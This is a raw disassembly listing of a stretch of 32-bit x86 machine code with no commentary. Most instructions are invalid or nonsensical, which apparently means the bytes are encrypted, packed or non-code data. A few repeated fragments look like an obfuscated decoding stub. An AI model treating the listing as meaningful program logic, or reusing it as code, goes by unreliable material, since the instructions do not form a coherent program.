  40a253:	mov    cl,0x9c
  40a255:	push   ss
  40a256:	jnp    0x40a1d8
  40a258:	jo     0x40a263
  40a25a:	test   DWORD PTR [ebx],esi
  40a25c:	mov    al,ds:0xfb1bc8f
  40a261:	pop    ecx
  40a262:	or     BYTE PTR [ebp+0x25],bl
  40a265:	imul   ecx,DWORD PTR [esi],0x43
  40a268:	sbb    bh,cl
  40a26a:	mov    ebp,0x9db30599
  40a26f:	inc    edi
  40a270:	adc    dx,0x7223
  40a275:	(bad)  
  40a276:	push   DWORD PTR [ebx]
  40a278:	(bad)  
  40a279:	mov    DWORD PTR [edi],eax
  40a27b:	mov    ecx,DWORD PTR [ebp+0x14]
  40a27e:	xor    edx,ebx
  40a280:	jmp    0x40a358
  40a285:	cmc    
  40a286:	jae    0x40a22c
  40a288:	cld    
  40a289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a28a:	(bad)  
  40a28b:	std    
  40a28c:	jnp    0x40a269
  40a28e:	out    0xd1,eax
  40a290:	lahf   
  40a291:	sbb    DWORD PTR [eax],esi
  40a293:	sub    bl,al
  40a295:	mov    DWORD PTR [ebp+0x0],esp
  40a298:	add    BYTE PTR [ebx+0x2e000000],bh
  40a29e:	inc    ebp
  40a29f:	pop    ebp
  40a2a0:	cmp    esi,DWORD PTR [edi]
  40a2a2:	jmp    0x703b6313
  40a2a7:	push   ebx
  40a2a8:	ja     0x40a300
  40a2aa:	fisttp WORD PTR [ebx+0x64]
  40a2ad:	ret    0x3bd1
  40a2b0:	cmp    DWORD PTR [eax-0x3f9567c3],0x44
  40a2b7:	(bad)  
  40a2b8:	sub    edi,DWORD PTR [edi]
  40a2ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2bb:	aam    0x21
  40a2bd:	stos   BYTE PTR es:[edi],al
  40a2be:	loopne 0x40a305
  40a2c0:	icebp  
  40a2c1:	push   cs
  40a2c2:	pop    esp
  40a2c3:	xchg   edi,eax
  40a2c4:	sbb    al,0xac
  40a2c6:	add    esp,DWORD PTR [edx+0x3f3d20e2]
  40a2cc:	les    esp,FWORD PTR [ecx+0x68]
  40a2cf:	adc    al,0xd5
  40a2d1:	mov    al,0xc9
  40a2d3:	loope  0x40a2e3
  40a2d5:	fcmovnbe st,st(5)
  40a2d7:	outs   dx,BYTE PTR ds:[esi]
  40a2d8:	gs mov ebp,0xd8a09854
  40a2de:	enter  0xa625,0x39
  40a2e2:	mov    ?,ebx
  40a2e4:	or     bh,BYTE PTR [edx-0x3b]
  40a2e7:	imul   esp,DWORD PTR [esi+ecx*1],0xffffffbd
  40a2eb:	sar    dh,1
  40a2ed:	(bad)  
  40a2ef:	leave  
  40a2f0:	jl     0x40a2f9
  40a2f2:	xchg   ecx,esi
  40a2f4:	push   0x16
  40a2f6:	jo     0x40a32f
  40a2f8:	not    edi
  40a2fa:	inc    ecx
  40a2fb:	jmp    0x40a34a
  40a2fd:	sbb    al,0x6f
  40a2ff:	adc    al,0xec
  40a301:	cwde   
  40a302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a303:	sbb    bl,BYTE PTR [esi-0x67]
  40a306:	push   cs
  40a307:	mov    bh,0x3e
  40a309:	inc    esp
  40a30a:	sbb    eax,0x58eb0276
  40a30f:	es icebp 
  40a311:	inc    esi
  40a312:	mov    esp,0xae598e6b
  40a317:	pushf  
  40a318:	or     eax,0x5e6da17e
  40a31d:	inc    edi
  40a31e:	push   ebx
  40a31f:	dec    edx
  40a320:	add    esi,ecx
  40a322:	mov    WORD PTR [edi+ecx*1+0x70040396],gs
  40a329:	mov    bh,0x26
  40a32b:	mov    BYTE PTR [ebx-0x32],bl
  40a32e:	cdq    
  40a32f:	and    BYTE PTR [edx-0x6],al
  40a332:	test   DWORD PTR [eax],edx
  40a334:	rol    DWORD PTR [edi],1
  40a336:	mov    cl,0x4d
  40a338:	rcr    DWORD PTR [ecx+0x33],cl
  40a33b:	dec    ecx
  40a33c:	ds push ds
  40a33e:	and    BYTE PTR [ecx+0x25],dh
  40a341:	fdiv   QWORD PTR [ebx+ebp*1]
  40a344:	addr16 (bad) 
  40a346:	pop    ebp
  40a347:	mov    esp,0xed5be0c
  40a34c:	les    eax,FWORD PTR [esi+ebp*2]
  40a34f:	jae    0x40a3a9
  40a351:	dec    eax
  40a352:	cmp    eax,0x6e433ab6
  40a357:	and    eax,0x8b045789
  40a35c:	pop    es
  40a35d:	mov    edx,DWORD PTR [edi+0x4]
  40a360:	xor    edx,ebx
  40a362:	xor    eax,esi
  40a364:	add    eax,0x99b8624d
  40a369:	adc    edx,0x8ddc
  40a36f:	mov    DWORD PTR [ebp+0x8],eax
  40a372:	jmp    0x40a44a
  40a377:	xlat   BYTE PTR ds:[ebx]
  40a378:	pushf  
  40a379:	sbb    ebx,eax
  40a37b:	pop    ebx
  40a37c:	(bad)  
  40a37e:	lahf   
  40a37f:	test   eax,0xfbde28f3
  40a384:	mov    esi,0x6644c7ad
  40a389:	add    BYTE PTR [eax],al
  40a38b:	mov    ebx,0xf6000000
  40a390:	ret    0x7753
  40a393:	es mov al,0x45
  40a396:	test   BYTE PTR [ecx+0x298c06b4],bh
  40a39c:	outs   dx,BYTE PTR ds:[esi]
  40a39d:	arpl   WORD PTR [ebx-0x6730d5d0],di
  40a3a3:	dec    edi
  40a3a4:	mov    bh,0xa0
  40a3a6:	shl    esi,cl
  40a3a8:	dec    esp
  40a3a9:	jl     0x40a3cf
  40a3ab:	jmp    0xfec9df79
  40a3b0:	repz mov esp,0x51ca43f2
  40a3b6:	jo     0x40a396
  40a3b8:	in     eax,0xdb
  40a3ba:	(bad)  
  40a3bc:	jae    0x40a3ae
  40a3be:	outs   dx,BYTE PTR ds:[esi]
  40a3bf:	lahf   
  40a3c0:	push   ebp
  40a3c1:	les    eax,FWORD PTR [ebp-0x121b0cb9]
  40a3c7:	jg     0x40a3bb
  40a3c9:	lods   eax,DWORD PTR ds:[esi]
  40a3ca:	jno    0x40a38b
  40a3cc:	cwde   
  40a3cd:	(bad)  
  40a3cf:	mov    bl,BYTE PTR [ecx]
  40a3d1:	out    dx,eax
  40a3d2:	wrmsr  
  40a3d4:	(bad)  
  40a3d5:	jle    0x40a443
  40a3d7:	ins    DWORD PTR es:[edi],dx
  40a3d8:	xchg   esi,eax
  40a3d9:	fbstp  TBYTE PTR [ebx+0x110e0390]
  40a3df:	push   0x6c82649f
  40a3e4:	pushf  
  40a3e5:	cmp    bh,BYTE PTR [ecx+eax*8]
  40a3e8:	add    dl,BYTE PTR [ecx]
  40a3ea:	push   ebx
  40a3eb:	add    bl,BYTE PTR [ebx+eax*2-0x14]
  40a3ef:	(bad)  
  40a3f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3f1:	cmp    BYTE PTR [edx+0x2cf84705],al
  40a3f7:	int    0x1
  40a3f9:	sub    DWORD PTR [ecx],eax
  40a3fb:	adc    eax,0x10f34a9f
  40a400:	xor    eax,0x42753ab5
  40a405:	lahf   
  40a406:	xor    BYTE PTR [ebx+edi*2],dh
  40a409:	pop    edx
  40a40a:	pop    esi
  40a40b:	mov    eax,DWORD PTR [eax]
  40a40d:	cmp    cl,bl
  40a40f:	scas   al,BYTE PTR es:[edi]
  40a410:	fwait
  40a411:	jmp    0x40a483
  40a413:	sub    eax,0x656fd57c
  40a418:	in     eax,dx
  40a419:	aad    0x53
  40a41b:	sub    bh,0x3b
  40a41e:	iret   
  40a41f:	mov    esp,0xa7685a5d
  40a424:	(bad)  
  40a425:	neg    BYTE PTR [eax+0x77]
  40a428:	sub    ebp,0x85d5e705
  40a42e:	fidivr DWORD PTR [edi]
  40a430:	gs pop edx
  40a432:	cmc    
  40a433:	add    al,0x33
  40a435:	mov    edi,0x53147759
  40a43a:	dec    ebp
  40a43b:	and    esp,esp
  40a43d:	fbld   TBYTE PTR [ecx]
  40a43f:	js     0x40a4b8
  40a441:	fcom   st(0)
  40a443:	mov    eax,ds:0x54f37ab0
  40a448:	test   eax,0x89018b43
  40a44d:	push   ebp
  40a44e:	or     al,0x8b
  40a450:	push   ecx
  40a451:	add    al,0xe9
  40a453:	rol    DWORD PTR [eax],cl
  40a455:	add    BYTE PTR [eax],al
  40a457:	mov    ds,WORD PTR cs:[ecx-0x10884690]
  40a45e:	ficomp WORD PTR [esi+0x4b]
  40a461:	aaa    
  40a462:	jo     0x40a4c2
  40a464:	jmp    0x673fb23c
  40a469:	add    BYTE PTR [eax],al
  40a46b:	mov    ebx,0x2b000000
  40a470:	je     0x40a4d1
  40a472:	test   eax,0xf2be4d1b
  40a477:	fadd   QWORD PTR [ecx+0xfacd4fd]
  40a47d:	fxch   st(4)
  40a47f:	adc    BYTE PTR [edx+0x58f78e3],cl
  40a485:	ficomp WORD PTR [ebx-0x5bc10a9d]
  40a48b:	cmp    al,BYTE PTR [ebp+edx*2+0x7e]
  40a48f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a491:	mov    ebp,0xe85c50f0
  40a496:	ret    
  40a497:	scas   eax,DWORD PTR es:[edi]
  40a498:	cli    
  40a499:	xchg   esp,eax
  40a49a:	mov    ecx,0xde32638a
  40a49f:	fnsave [esi]
  40a4a1:	mov    eax,0x4cb081d4
  40a4a6:	mov    al,0xe
  40a4a8:	pop    es
  40a4a9:	add    BYTE PTR [ecx],dl
  40a4ab:	(bad)  
  40a4ac:	pop    ecx
  40a4ad:	daa    
  40a4ae:	stc    
  40a4af:	jecxz  0x40a489
  40a4b1:	(bad)  
  40a4b2:	mov    bl,0x4b
  40a4b4:	sti    
  40a4b5:	call   0x1dc44450
  40a4ba:	lods   eax,DWORD PTR ds:[esi]
  40a4bb:	mov    fs,edi
  40a4bd:	xchg   edi,eax
  40a4be:	dec    esi
  40a4bf:	in     eax,dx
  40a4c0:	scas   al,BYTE PTR es:[edi]
  40a4c1:	and    ebx,DWORD PTR [ebx+0x20]
  40a4c4:	xchg   edx,eax
  40a4c5:	scas   al,BYTE PTR es:[di]
  40a4c7:	retf   0x7268
  40a4ca:	fisttp QWORD PTR [edx-0x26]
  40a4cd:	out    0xaf,al
  40a4cf:	inc    edx
  40a4d0:	mov    WORD PTR [ecx],?
  40a4d2:	int3   
  40a4d3:	jecxz  0x40a4dc
  40a4d5:	scas   al,BYTE PTR es:[edi]
  40a4d6:	mov    ecx,0x97992382
  40a4db:	and    eax,DWORD PTR [edi]
  40a4dd:	in     al,dx
  40a4de:	or     DWORD PTR [ebx+0x3f],esp
  40a4e1:	mov    ds:0x8347e952,eax
  40a4e6:	adc    eax,0x1856e65f
  40a4eb:	inc    eax
  40a4ec:	cmc    
  40a4ed:	call   0x6ec:0x3cd343fa
  40a4f4:	in     al,0x62
  40a4f6:	sub    eax,0xe44afb34
  40a4fb:	sub    DWORD PTR [edx],eax
  40a4fd:	jl     0x40a510
  40a4ff:	repnz repz and eax,0xaa7d69cf
  40a506:	inc    edx
  40a507:	fstp   DWORD PTR [edx]
  40a509:	dec    edi
  40a50a:	lock adc dh,BYTE PTR [ebx]
  40a50d:	div    DWORD PTR [ebp+0x761fc74d]
  40a513:	cmp    dh,al
  40a515:	xor    eax,DWORD PTR [ecx-0x4d]
  40a518:	lahf   
  40a519:	push   ecx
  40a51a:	mov    dh,0xb6
  40a51c:	in     al,0xcc
  40a51e:	mov    ecx,0x40e2b37f
  40a523:	(bad)  
  40a524:	je     0x40a51f
  40a526:	and    eax,0x3303fce8
  40a52b:	(bad)  
  40a52c:	jmp    0x40a604
  40a531:	jge    0x9fdb4451
  40a537:	(bad)  
  40a538:	popf   
  40a539:	push   esi
  40a53a:	out    0x25,al
  40a53c:	imul   ecx,DWORD PTR ds:0xba1c9daa,0xbb000067
  40a546:	add    BYTE PTR [eax],al
  40a548:	add    BYTE PTR [eax+0x4cc20321],ah
  40a54e:	ret    
  40a54f:	pop    ebx
  40a550:	or     bh,al
  40a552:	out    0xfe,al
  40a554:	pushf  
  40a555:	mov    ebx,0xe61addc
  40a55a:	cmp    edi,DWORD PTR [ecx-0x1608caad]
  40a560:	jecxz  0x40a52e
  40a562:	rol    BYTE PTR [ecx-0x12485c56],0x5e
  40a569:	mov    ch,0xac
  40a56c:	mov    WORD PTR [edi],es
  40a56e:	or     eax,0x96fe506
  40a573:	jg     0x40a508
  40a575:	sbb    dh,BYTE PTR [ecx-0x21013bd5]
  40a57b:	rol    esp,cl
  40a57d:	(bad)  
  40a57e:	aad    0x86
  40a580:	icebp  
  40a581:	sub    dl,0x7a
  40a584:	pop    eax
  40a585:	sbb    DWORD PTR [esp+edi*4],edx
  40a588:	outs   dx,BYTE PTR ds:[esi]
  40a589:	add    eax,0x70040e80
  40a58e:	test   eax,0xf6ad0647
  40a593:	mov    eax,0x626d054f
  40a598:	call   0x6459:0xdf222b93
  40a59f:	xor    BYTE PTR gs:[ecx+ebp*1-0x4100c19c],dl
  40a5a7:	jo     0x40a59c
  40a5a9:	mov    esi,eax
  40a5ab:	mov    dl,BYTE PTR [edi+0x57]
  40a5ae:	test   eax,0xe08af997
  40a5b3:	xor    al,0x7a
  40a5b5:	cdq    
  40a5b6:	xchg   edi,eax
  40a5b7:	cmc    
  40a5b8:	mov    esi,0x62ade7ca
  40a5bd:	cmp    al,0xe9
  40a5bf:	mov    BYTE PTR [edi],al
  40a5c1:	add    edi,esi
  40a5c3:	dec    ebx
  40a5c4:	mov    ecx,0xeefbad60
  40a5c9:	mov    al,0x53
  40a5cb:	xchg   ecx,eax
  40a5cc:	dec    ebx
  40a5cd:	imul   ebp,DWORD PTR [esi-0x11],0xa88b8b37
  40a5d4:	cwde   
  40a5d5:	or     DWORD PTR [edi+0x40],0xeaf54849
  40a5dc:	add    ch,0x58
  40a5df:	xor    eax,0xad5ed134
  40a5e4:	test   al,0xbb
  40a5e6:	psubd  mm6,QWORD PTR es:[edi+0x72ad1960]
  40a5ee:	ja     0x40a617
  40a5f0:	fmul   st(3),st
  40a5f2:	add    BYTE PTR [edx+0x52],0x75
  40a5f6:	sub    al,0xe4
  40a5f8:	mov    ebx,0xc35038b
  40a5fd:	pusha  
  40a5fe:	jmp    0xe3be6832
  40a603:	cld    
  40a604:	xor    edx,ebx
  40a606:	jmp    0x40a6de
  40a60b:	les    ebp,FWORD PTR [ebp-0x4a025a63]
  40a611:	cld    
  40a612:	in     eax,dx
  40a613:	sub    dl,BYTE PTR [ebx]
  40a615:	ror    DWORD PTR [edi],cl
  40a617:	inc    ebp
  40a618:	mov    esp,0x6875c776
  40a61d:	add    BYTE PTR [eax],al
  40a61f:	mov    ebx,0x36000000
  40a624:	pop    ecx
  40a625:	sub    eax,DWORD PTR [edx+0x73f57d9e]
  40a62b:	pop    es
  40a62c:	retf   0x75d0
  40a62f:	push   ss
  40a630:	andps  xmm7,XMMWORD PTR [ebp+0x30431ba4]
  40a637:	xchg   bl,ch
  40a639:	loope  0x40a6b7
  40a63b:	pusha  
  40a63c:	jo     0x40a60b
  40a63e:	cmp    al,BYTE PTR [ebp-0x3a]
  40a641:	mov    dl,BYTE PTR [eax+eax*8-0x5f6b7954]
  40a648:	mov    esi,0x394f1f04
  40a64d:	and    BYTE PTR [ebx],dl
  40a64f:	jns    0x40a67c
  40a651:	cmp    al,BYTE PTR [ebx]
  40a653:	adc    BYTE PTR [ebx],ch
  40a655:	adc    al,0x97
  40a657:	push   ecx
  40a658:	and    BYTE PTR [esi+0x6f],dh
  40a65b:	fsubr  st,st(0)
  40a65d:	fs test al,0xb7
  40a660:	jmp    0x40a682
  40a662:	sub    al,0x6d
  40a664:	sub    eax,0xcb1a48ac
  40a669:	mov    ch,0x7c
  40a66b:	(bad)  
  40a66c:	and    DWORD PTR [eax-0x3bfd72ea],eax
  40a672:	dec    eax
  40a673:	mov    esp,0xe8bf1c57
  40a678:	xchg   ebx,eax
  40a679:	fdivrp st(7),st
  40a67b:	scas   al,BYTE PTR es:[edi]
  40a67c:	cmp    eax,0xe398a4a5
  40a681:	dec    esp
  40a682:	shr    DWORD PTR [ebp+0x30],1
  40a685:	cmc    
  40a686:	nop
  40a687:	pop    ebp
  40a688:	(bad)  
  40a689:	xor    DWORD PTR [esi+0x13fdd1ea],ecx
  40a68f:	pop    esp
  40a690:	push   edx
  40a691:	jbe    0x40a6fa
  40a693:	mov    ebp,0xbc228477
  40a698:	cmp    edi,ebx
  40a69a:	xor    eax,0x7ddec470
  40a69f:	xor    cl,bh
  40a6a1:	enter  0x8737,0x8c
  40a6a5:	xor    DWORD PTR [ebp-0x46],eax
  40a6a8:	pop    es
  40a6a9:	data16 test al,0xb6
  40a6ac:	out    dx,al
  40a6ad:	sub    eax,0xeae388a0
  40a6b2:	lds    esp,FWORD PTR [edx+0x7de8b27b]
  40a6b8:	adc    eax,0x1c48d7ee
  40a6bd:	inc    edi
  40a6be:	sub    edx,DWORD PTR [edi]
  40a6c0:	jb     0x40a703
  40a6c2:	mov    ah,0x86
  40a6c4:	jb     0x40a6df
  40a6c6:	inc    edi
  40a6c7:	mov    bl,0xf6
  40a6c9:	or     esp,ebp
  40a6cb:	js     0x40a67a
  40a6cd:	and    ebp,DWORD PTR [eax-0x57]
  40a6d0:	add    al,BYTE PTR [esi]
  40a6d2:	inc    esi
  40a6d3:	mov    ebp,0xc015e1e1
  40a6d8:	push   esp
  40a6d9:	outs   dx,DWORD PTR ds:[esi]
  40a6da:	fs aas 
  40a6dc:	cld    
  40a6dd:	aas    
  40a6de:	add    eax,0x99b8624d
  40a6e3:	jmp    0x40a7bb
  40a6e8:	daa    
  40a6e9:	inc    DWORD PTR [ecx-0x88026ab]
  40a6ef:	dec    DWORD PTR [esi]
  40a6f1:	mov    WORD PTR [ebp+ecx*8-0x3c58fabd],?
  40a6f8:	xor    BYTE PTR [ecx+0x0],ch
  40a6fb:	add    BYTE PTR [ebx+0x2000000],bh
  40a701:	sub    cl,BYTE PTR [esi-0x74]
  40a704:	mov    ?,WORD PTR [eax-0x32f9a38a]
  40a70a:	jecxz  0x40a6df
  40a70c:	mov    eax,ds:0xfd513e3c
  40a711:	dec    edi
  40a712:	pop    edx
  40a713:	shr    DWORD PTR [ebx+0x6e86c1e3],cl
  40a719:	sbb    cl,0xf0
  40a71c:	adc    dl,ch
  40a71e:	sub    cl,BYTE PTR [ebx+0x45d27b28]
  40a724:	sub    DWORD PTR [esi+eax*8],esp
  40a727:	fs clc 
  40a729:	outs   dx,DWORD PTR ds:[esi]
  40a72a:	inc    edx
  40a72b:	mov    bh,0xbe
  40a72d:	imul   DWORD PTR ds:0xeea5ba72
  40a733:	inc    ebx
  40a734:	sub    dh,BYTE PTR [esi*8-0x3f144c0e]
  40a73b:	rcl    BYTE PTR [ebx-0x53],1
  40a73e:	outs   dx,DWORD PTR ds:[esi]
  40a73f:	sbb    ch,bh
  40a741:	loopne 0x40a71a
  40a743:	mov    BYTE PTR [edx-0x407901fc],al
  40a749:	sub    al,0xe
  40a74b:	add    BYTE PTR [ebx-0x2],ch
  40a74e:	aam    0xd6
  40a750:	mov    WORD PTR [esi+0x13],gs
  40a753:	push   ds
  40a754:	leave  
  40a755:	arpl   WORD PTR ds:0x4059837b,ax
  40a75b:	inc    ebp
  40a75c:	push   edx
  40a75d:	ins    DWORD PTR es:[edi],dx
  40a75e:	idiv   BYTE PTR [eax-0x12]
  40a761:	push   0xffffffd2
  40a763:	fs in  al,dx
  40a765:	mov    eax,ds:0xbdde32aa
  40a76a:	clc    
  40a76b:	or     BYTE PTR [edi],dl
  40a76d:	xor    DWORD PTR [eax],edx
  40a76f:	or     ebp,DWORD PTR fs:[edi-0x436b8c98]
  40a776:	test   al,0x42
  40a778:	ret    
  40a779:	aam    0x70
  40a77b:	mov    ebx,0x21d0c77c
  40a780:	leave  
  40a781:	cmc    
  40a782:	repz fisttp WORD PTR [ecx+0x388fb8f3]
  40a789:	push   esi
  40a78a:	call   0xbddd8505
  40a78f:	jl     0x40a7e4
  40a791:	hlt    
  40a792:	outs   dx,DWORD PTR ds:[esi]
  40a793:	call   0x28e4:0xdc7fe5fd
  40a79a:	dec    ebx
  40a79b:	fwait
  40a79c:	mov    ds,WORD PTR [ebx]
  40a79e:	push   ebp
  40a79f:	mov    eax,ds:0xf568409d
  40a7a4:	mov    ebx,0x8fbd95d3
  40a7a9:	mov    eax,0xe2326a1e
  40a7ae:	fild   DWORD PTR [edi+ecx*8-0x2f]
  40a7b2:	fld    TBYTE PTR [esi+0x620d3461]
  40a7b8:	arpl   WORD PTR [esi+0x1b],cx
  40a7bb:	adc    edx,0x8ddc
  40a7c1:	jmp    0x40a899
  40a7c6:	aaa    
  40a7c7:	adc    al,0x4d
  40a7c9:	xchg   esi,eax
  40a7ca:	outs   dx,DWORD PTR ds:[esi]
  40a7cb:	(bad)  
  40a7cd:	mov    ch,0x45
  40a7cf:	sti    
  40a7d0:	mov    ecx,0x6f54fa02
  40a7d5:	in     al,0xeb
  40a7d7:	imul   eax,DWORD PTR [eax],0xbb00
  40a7dd:	add    BYTE PTR [ecx],bl
  40a7df:	rcr    DWORD PTR [ebp-0x4185a5da],cl
  40a7e5:	mov    ah,0xee
  40a7e7:	aaa    
  40a7e8:	push   es
  40a7e9:	in     eax,dx
  40a7ea:	jp     0x40a863
  40a7ec:	pop    esi
  40a7ed:	mov    cl,0x14
  40a7ef:	jmp    0xd4f8:0x3c85664f
  40a7f6:	xchg   ebp,eax
  40a7f7:	xchg   ebx,eax
  40a7f8:	or     ecx,DWORD PTR [ecx-0x5f]
  40a7fb:	mov    bh,0x4c
  40a7fd:	push   es
  40a7fe:	mov    ah,0x89
  40a800:	dec    edi
  40a801:	cmp    eax,0x38cc118a
  40a806:	mov    ebx,0x417ce455
  40a80b:	or     BYTE PTR [ebp+ebp*2-0x71],bl
  40a80f:	je     0x40a872
  40a811:	dec    edi
  40a812:	push   DWORD PTR [edi+0x56]
  40a815:	pop    edx
  40a816:	sbb    DWORD PTR [edx],edi
  40a818:	inc    edi
  40a819:	adc    DWORD PTR [edi],0xffffffdb
  40a81c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a81d:	xchg   edx,eax
  40a81e:	or     BYTE PTR [edx-0x48673f94],cl
  40a824:	ror    DWORD PTR [edx+0x47],cl
  40a827:	imul   esp,DWORD PTR [ecx+esi*8+0x4576472c],0xc741edd7
  40a832:	call   0x72880d13
  40a837:	mov    WORD PTR [edi-0x74688082],?
  40a83d:	and    eax,0x4c9adf53
  40a842:	jno    0x40a888
  40a844:	push   ebp
  40a845:	lods   al,BYTE PTR ds:[esi]
  40a846:	test   BYTE PTR [esi-0x65],dh
  40a849:	jge    0x40a883
  40a84b:	xor    al,0xb5
  40a84d:	pop    edi
  40a84e:	jg     0x40a87d
  40a850:	in     eax,0xc6
  40a852:	inc    esp
  40a853:	(bad)  
  40a854:	dec    esp
  40a855:	mov    ds:0xcaad20f3,al
  40a85a:	jb     0x40a856
  40a85c:	xchg   edi,eax
  40a85d:	mov    esi,0x3dd72f60
  40a862:	(bad)  
  40a863:	push   ebx
  40a864:	or     al,0xa9
  40a866:	sar    BYTE PTR [esi+0x1a],cl
  40a869:	stos   BYTE PTR es:[edi],al
  40a86a:	sub    al,0x3
  40a86c:	jp     0x40a8d3
  40a86e:	retf   0xd44f
  40a871:	cmp    eax,DWORD PTR [edx]
  40a873:	add    al,0x9
  40a875:	sub    ecx,DWORD PTR [ecx]
  40a877:	pop    edx
  40a878:	scas   al,BYTE PTR es:[edi]
  40a879:	ins    BYTE PTR es:[edi],dx
  40a87a:	imul   esi,DWORD PTR [edi+edx*4],0x8051d5f9
  40a881:	push   edi
  40a882:	pop    eax
  40a883:	scas   eax,DWORD PTR es:[edi]
  40a884:	xchg   ebx,eax
  40a885:	ds jg  0x40a857
  40a888:	mov    DWORD PTR [esi+0x1],ebp
  40a88b:	jmp    0x3bd:0xce453648
  40a892:	xchg   esi,eax
  40a893:	mov    DWORD PTR [ebx-0x1f],esi
  40a896:	push   ss
  40a897:	popa   
  40a898:	mov    esp,0xe9084539
  40a89d:	rol    DWORD PTR [eax],cl
  40a89f:	add    BYTE PTR [eax],al
  40a8a1:	adc    edx,0xffffffdb
  40a8a4:	sub    bl,bl
  40a8a6:	sub    ebx,esi
  40a8a8:	sti    
  40a8a9:	cwde   
  40a8aa:	or     ah,dl
  40a8ac:	int3   
  40a8ad:	add    BYTE PTR [eax],bl
  40a8af:	iret   
  40a8b0:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40a8b2:	push   0x0
  40a8b4:	add    BYTE PTR [ebx+0x6c000000],bh
  40a8ba:	sbb    esp,DWORD PTR [eax+0xf3ac4ca]
  40a8c0:	jecxz  0x40a876
  40a8c2:	(bad)  
  40a8c3:	fistp  DWORD PTR [edi+0x4ef7d87e]
  40a8c9:	pop    edx
  40a8ca:	add    DWORD PTR [edx+0x3],edx
  40a8cd:	push   es
  40a8ce:	lahf   
  40a8cf:	gs mov dh,0xa8
  40a8d2:	bound  esp,QWORD PTR [eax+0x7fd4cf00]
  40a8d8:	xor    edx,DWORD PTR [edi+0x25]
  40a8db:	sub    DWORD PTR [ecx+edi*2+0x16],esp
  40a8df:	add    eax,0x43f402f
  40a8e4:	cli    
  40a8e5:	sbb    ebp,DWORD PTR [eax-0x5c]
  40a8e8:	jo     0x40a8ac
  40a8ea:	add    BYTE PTR [ebx],dl
  40a8ec:	test   BYTE PTR [eax-0x73f952f7],cl
  40a8f2:	gs or  BYTE PTR es:[eax],al
  40a8f6:	or     bh,BYTE PTR [edx+edi*2-0x77]
  40a8fa:	xor    DWORD PTR [ebx-0x3e],eax
  40a8fd:	test   BYTE PTR [edx+eiz*1+0x36],ah
  40a901:	sbb    esi,DWORD PTR [ebx]
  40a903:	outs   dx,DWORD PTR ds:[esi]
  40a904:	push   0x33927a80
  40a909:	jmp    0xfc7:0x36bef6fe
  40a910:	jbe    0x40a91b
  40a912:	imul   ebp,DWORD PTR [edi],0x49
  40a915:	stos   DWORD PTR es:[edi],eax
  40a916:	mov    BYTE PTR ds:0x9e341aa8,ch
  40a91c:	jbe    0x40a955
  40a91e:	and    DWORD PTR [ebx],edx
  40a920:	into   
  40a921:	adc    eax,0x24344729
  40a926:	pop    edi
  40a927:	aas    
  40a928:	push   es
  40a929:	cmp    edx,DWORD PTR [ebp+eiz*4-0xc]
  40a92d:	pop    es
  40a92e:	rcr    ch,1
  40a930:	cmp    eax,edi
  40a932:	or     bl,dl
  40a934:	das    
  40a935:	stos   BYTE PTR es:[edi],al
  40a936:	inc    ecx
  40a937:	jo     0x40a998
  40a939:	lods   eax,DWORD PTR ds:[esi]
  40a93a:	fidivr WORD PTR [eax-0xab5449c]
  40a940:	push   cs
  40a941:	push   edi
  40a942:	sbb    eax,0x621b1a59
  40a947:	retf   
  40a948:	aam    0xed
  40a94a:	jg     0x40a9cb
  40a94c:	and    eax,0xde5f1ba
  40a951:	jno    0x40a981
  40a953:	inc    ebx
  40a954:	loopne 0x40a93c
  40a956:	xchg   esp,eax
  40a957:	mov    al,0xb1
  40a959:	fidiv  DWORD PTR [esp+esi*4-0x72e15817]
  40a960:	imul   edi,DWORD PTR [ecx-0x3502d047],0xbe24dbf1
  40a96a:	push   esp
  40a96b:	std    
  40a96c:	ja     0x40a92f
  40a96e:	jb     0x40a9a9
  40a970:	shl    BYTE PTR [ecx-0x7af0f78d],1
  40a976:	loope  0x40a978
  40a978:	add    BYTE PTR [eax],al
  40a97a:	cmp    DWORD PTR [ebp+0xc],edx
  40a97d:	je     0x40ab43
  40a983:	jmp    0x40aa5b
  40a988:	cli    
  40a989:	or     eax,0xe3ff608e
  40a98e:	(bad)  
  40a98f:	lahf   
  40a990:	lahf   
  40a991:	add    al,0x19
  40a993:	fidiv  WORD PTR [esi]
  40a995:	out    0x9,al
  40a997:	xor    esp,DWORD PTR [ecx+0x6b]
  40a99a:	add    BYTE PTR [eax],al
  40a99c:	mov    ebx,0xec000000
  40a9a1:	push   0xffffff87
  40a9a3:	dec    ecx
  40a9a4:	into   
  40a9a5:	and    BYTE PTR [eax+ecx*8+0x54],0x34
  40a9aa:	sub    dl,BYTE PTR [ebx]
  40a9ac:	pop    ss
  40a9ad:	adc    BYTE PTR [esi+eax*2+0x7c0a7736],al
  40a9b4:	retf   0x3e0e
  40a9b7:	repz mov edi,0x9907c6dc
  40a9bd:	jg     0x40a9a9
  40a9bf:	je     0x40a98e
  40a9c1:	cmp    BYTE PTR [ebx-0x73],bh
  40a9c4:	stos   BYTE PTR es:[edi],al
  40a9c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9c6:	outs   dx,BYTE PTR ds:[esi]
  40a9c7:	mov    eax,ds:0xaca1d12e
  40a9cc:	xchg   esi,eax
  40a9cd:	adc    BYTE PTR [edx],al
  40a9cf:	mov    dh,0x75
  40a9d1:	ficomp WORD PTR [edx+0x5d87d99d]
  40a9d7:	and    eax,0xf183fda3
  40a9dc:	mov    al,ds:0x1c37ce5c
  40a9e1:	fmul   QWORD PTR [ecx-0x5ae35b5]
  40a9e7:	repnz and edi,DWORD PTR [edi]
  40a9ea:	adc    eax,0xe4f5b94e
  40a9ef:	mov    eax,0x288c1519
  40a9f4:	loope  0x40a9a4
  40a9f6:	mov    dh,0x57
  40a9f8:	or     al,BYTE PTR [ebp+0x1b8adca9]
  40a9fe:	mov    eax,ds:0x896c1cb3
  40aa03:	push   cs
  40aa04:	mov    ds:0x9d109297,eax
  40aa09:	cmp    dl,BYTE PTR [edi]
  40aa0b:	mov    dh,BYTE PTR [edx+eax*2-0x64668ea0]
  40aa12:	fldcw  WORD PTR [esi+0x4594b290]
  40aa18:	push   ss
